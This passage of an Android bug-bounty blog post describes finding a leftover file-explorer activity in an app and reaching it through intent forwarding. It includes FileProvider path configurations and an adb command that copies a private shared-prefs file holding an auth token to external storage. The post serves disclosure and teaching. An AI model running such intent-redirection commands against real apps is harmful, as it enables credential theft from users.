So I decided to do what @bagipro does in <a href=https://hackerone.com/reports/272044>this report</a>. But it didn&rsquo;t work because in all the excitement I forgot to check the <code>android:resource</code> of that provider. And they didn&rsquo;t allow any root-path and had access to only 1 specific folder. Below is an example of how their <code>provider_path.xml</code> file looked like.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>&lt;paths&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&lt;cache-path</span> <span style=color:#b3d23c>name=</span><span style=color:#98c379>&#34;pictures&#34;</span> <span style=color:#b3d23c>path=</span><span style=color:#98c379>&#34;pictures/&#34;</span><span style=color:#e06c75>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>&lt;/paths&gt;</span>
</span></span></code></pre></div><p>The exploit might have had a higher impact if the provider path was something like:</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#e06c75>&lt;paths&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>&lt;root-path</span> <span style=color:#b3d23c>name=</span><span style=color:#98c379>&#34;root&#34;</span> <span style=color:#b3d23c>path=</span><span style=color:#98c379>&#34;&#34;</span><span style=color:#e06c75>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>&lt;files-path</span> <span style=color:#b3d23c>name=</span><span style=color:#98c379>&#34;internal_files&#34;</span> <span style=color:#b3d23c>path=</span><span style=color:#98c379>&#34;.&#34;</span><span style=color:#e06c75>/&gt;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>&lt;/paths&gt;</span>
</span></span></code></pre></div><p>Since the content provider path wasn&rsquo;t worth following I decided to find some other protected components to see if I could trigger something else. And then I found the holy grail of insecure activities. There was a line in the <code>AndroidManifest.xml</code></p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#e06c75>&lt;activity</span> <span style=color:#b3d23c>android:label=</span><span style=color:#98c379>&#34;@string/activity_title_explorer&#34;</span> <span style=color:#b3d23c>android:name=</span><span style=color:#98c379>&#34;com.vulnerable.app.Explorer&#34;</span><span style=color:#e06c75>/&gt;</span>
</span></span></code></pre></div><p>and this activity literally opens a file explorer on the private directory(<code>/data/data/com.vulnerable.app</code>) of the app üòÇ. I seriously couldn&rsquo;t even understand why they had an activity with such functionality because after using ripgrep for more than an hour and trying to find the places that activity was called, I couldn&rsquo;t find anything.</p><p>My best guess is that they had this activity in the dev mode for easy access to the files and then just forgot to remove it (even this reason doesn&rsquo;t make sense). But whatever the reason might be, it was a goldmine for me. I went through the code of the <code>explorer</code> activity and saw that it accepted the extras <code>file</code> and <code>to</code> which literally accepts the path of a file and copies it to the <code>to</code> location. So all I had to do was:</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>adb shell am start -n com.vulnerable.app/.startActivity -a forward_action --es <span style=color:#63c381>&#34;forward_to&#34;</span> <span style=color:#63c381>&#34;com.vulnerable.app.Explorer&#34;</span> --es <span style=color:#63c381>&#34;file&#34;</span> <span style=color:#63c381>&#34;/data/data/com.vulnerable.app/sharedprefs/&lt;FILE_STORING_AUTH_TOKEN&gt; --es &#34;</span>to<span style=color:#63c381>&#34; &#34;</span>/sdcard/Download/<span style=color:#63c381>&#34;
</span></span></span></code></pre></div><p>And the internal file would be moved to the external directory from which it can easily be exfiltrated to external servers.</p><p><strong>Update</strong>: After asking why they had such activity in place they told me that some of their clients have &ldquo;special requests&rdquo; in which they ask the company to allow them to see what sort of data is stored within the app.</p><hr><p>This sort of vulnerability is not very common but can still be seen in various apps.</p><p>To read more about this sort of vulnerability read the reports I mentioned above. And also read the following blog posts, they explain everything in more depth and with more technicality.</p><ul><li><a href=https://blog.oversecured.com/Android-Access-to-app-protected-components/>https://blog.oversecured.com/Android-Access-to-app-protected-components/</a></li><li><a href=https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/>https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/</a></li></ul><hr><p>Thanks for reading, feedback is always appreciated :)</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.mzfr.me/tags/android/>Android</a></li></ul><nav class=paginav><a class=prev href=https://blog.mzfr.me/posts/2021-11-05-intro-to-cardano-tx/><span class=title>¬´ Prev</span><br><span>Introduction to Cardano components</span></a>
<a class=next href=https://blog.mzfr.me/posts/2021-04-24-oscp-experience/><span class=title>Next ¬ª</span><br><span>My OSCP experience</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.mzfr.me>mzfr's blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>